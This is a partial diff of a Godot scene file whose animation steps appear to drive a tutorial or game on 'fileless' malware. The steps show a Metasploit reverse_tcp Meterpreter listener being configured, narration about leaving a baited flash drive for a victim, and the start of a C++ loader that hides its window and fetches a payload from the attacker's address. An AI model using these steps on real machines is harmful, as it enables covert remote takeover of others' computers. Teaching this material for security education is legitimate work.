+[sub_resource type="ShaderMaterial" id="ShaderMaterial_3jqaa"]
+shader = SubResource("Shader_k518g")
+shader_parameter/rect_color = Color(0, 0, 0, 0.607843)
+shader_parameter/hole_position = Vector2(0.115, 0.815)
+shader_parameter/hole_size = Vector2(3.24, 0.45)
+
+[sub_resource type="Animation" id="Animation_4uhwa"]
+resource_name = "fileless_10"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
+LHOST => 192.168.56.102
+msf6 exploit(multi/handler) >  set LPORT 8000
+LPORT => 8000"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.1, 0.415)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 1.26)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Same as above — this needs to match the LPORT from your generated payload."]
+}
+
+[sub_resource type="Animation" id="Animation_55b8s"]
+resource_name = "fileless_11"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
+LHOST => 192.168.56.102
+msf6 exploit(multi/handler) >  set LPORT 8000
+LPORT => 8000
+msf6 exploit(multi/handler) > show options"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.125, 1.625)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.07, 0.26)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This will display a table of all configurable arguments for the chosen payload"]
+}
+
+[sub_resource type="Animation" id="Animation_s614g"]
+resource_name = "fileless_12"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
+LHOST => 192.168.56.102
+msf6 exploit(multi/handler) >  set LPORT 8000
+LPORT => 8000
+msf6 exploit(multi/handler) > show options
+Payload options (windows/meterpreter/reverse_tcp)
+
+		  Name         Current Setting      Required       Description
+
+		  EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
+																				 seh, thr, ead, process, none)
+		  LHOST       192.168.29.208         yes         The listen address (an 
+																				 interface maybe specified)
+		  LPORT       8000                           yes         The listen port 
+"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.15, 1.835)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.305, 1.915)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Seems everything is right, let's try to run our listener and get ready for our next step"]
+}
+
+[sub_resource type="Animation" id="Animation_sq4em"]
+resource_name = "fileless_13"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
+LHOST => 192.168.56.102
+msf6 exploit(multi/handler) >  set LPORT 8000
+LPORT => 8000
+msf6 exploit(multi/handler) > show options
+Payload options (windows/meterpreter/reverse_tcp)
+
+		  Name         Current Setting      Required       Description
+
+		  EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
+																				 seh, thr, ead, process, none)
+		  LHOST       192.168.29.208         yes         The listen address (an 
+																				 interface maybe specified)
+		  LPORT       8000                           yes         The listen port 
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.29.208:8000"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.64, 0.4)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.15, 3.635)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Right now our listener is ready, it's time to get the flashdrive and wait for someone to pick it up"]
+}
+
+[sub_resource type="Animation" id="Animation_rm36m"]
+resource_name = "fileless_14"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.125, 0.63)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.5, 0.43)]
+}
+
+[sub_resource type="Animation" id="Animation_xj15o"]
+resource_name = "fileless_15"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.125, 1)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.5, 0.43)]
+}
+
+[sub_resource type="Animation" id="Animation_ruw4w"]
+resource_name = "fileless_16"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.125, 1.425)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.5, 2.825)]
+}
+
+[sub_resource type="Animation" id="Animation_yn5m6"]
+resource_name = "fileless_5"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(-0.02, 0)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(4.035, 4.1)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Desktop:visible")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless:visible")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Now we need to setup our listener"]
+}
+
+[sub_resource type="Animation" id="Animation_axcpf"]
+resource_name = "fileless_6"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.13, 0.04)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(1.37, 0.23)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Let's setup our console using metasploit"]
+}
+
+[sub_resource type="Animation" id="Animation_u2gx2"]
+resource_name = "fileless_7"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.13, 0.225)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.405, 0.23)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [" This module doesn’t exploit anything — it just waits (listens) for a payload to connect back. 
+
+ Perfect for catching a reverse_tcp payload you made with msfvenom."]
+}
+
+[sub_resource type="Animation" id="Animation_bt0j7"]
+resource_name = "fileless_8"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Matches the payload type you generated earlier — this is critical.
+
+ If the payload you made in msfvenom is windows/meterpreter/reverse_tcp, this must be the same here"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp"]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.13, 0.425)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.45, 0.42)]
+}
+
+[sub_resource type="Animation" id="Animation_uxgbj"]
+resource_name = "fileless_9"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
+LHOST => 192.168.56.102"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 0.615)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.585, 0.675)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This should be the IP address of your attacking machine on the same network as the target.
+
+Must match the LHOST you used in msfvenom."]
+}
+
+[sub_resource type="Animation" id="Animation_07q5i"]
+resource_name = "fileless_boilerplate_1"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Desktop:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Now let's create our boilerplate"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+
+[sub_resource type="Animation" id="Animation_ma2p5"]
+resource_name = "fileless_boilerplate_2"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["#include <iostream>
+#include <cpr/cpr.h>
+#include <windows.h>"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 0.03)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(1.19, 0.67)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Now this are just the liblaries that we needed "]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+
+[sub_resource type="Animation" id="Animation_4u43o"]
+resource_name = "fileless_boilerplate_3"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["#include <iostream>
+#include <cpr/cpr.h>
+#include <windows.h>
+
+int main() {
+	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 0.825)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.94, 0.495)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This line prevents a visible console window from showing, so our program runs silently"]
+}
+
+[sub_resource type="Animation" id="Animation_pjxp5"]
+resource_name = "fileless_boilerplate_4"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["#include <iostream>
+#include <cpr/cpr.h>
+#include <windows.h>
+
+int main() {
+	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
+	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 1.23)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.135, 0.29)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Uses the cpr HTTP library to request data from the given address"]
+}
+
+[sub_resource type="Animation" id="Animation_0w6mh"]
+resource_name = "fileless_boilerplate_5"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
